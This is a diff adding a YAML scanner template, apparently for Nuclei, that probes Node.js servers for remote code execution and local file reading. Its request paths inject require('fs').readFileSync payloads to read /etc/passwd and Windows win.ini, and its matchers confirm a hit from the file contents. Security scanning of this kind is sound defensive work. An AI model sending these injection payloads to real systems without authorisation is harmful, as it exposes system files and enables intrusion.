@@ -1,0 +1,30 @@
+id: nodejs-read-local-files
+
+info:
+  name: NodeJS Read Local Files
+  author: reewardius
+  reference: https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44
+  severity: critical
+  tags: lfi,rce,lfr
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/var%20fs=require('fs');fs.readFileSync('/etc/passwd').toString('utf8')"
+      - "{{BaseURL}}/var%20fs=require('fs');fs.readFileSync('C:/Windows/win.ini').toString('utf8')"
+      - "{{BaseURL}}/var%20fs=require('fs');fs.readFileSync('C:\\Windows\\win.ini').toString('utf8')"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "root:x:0:0"
+          
+      - type: word
+        part: body
+        words:
+          - "bit app support"
+          - "[fonts]"
+          - "[mci extensions]"
+        condition: and
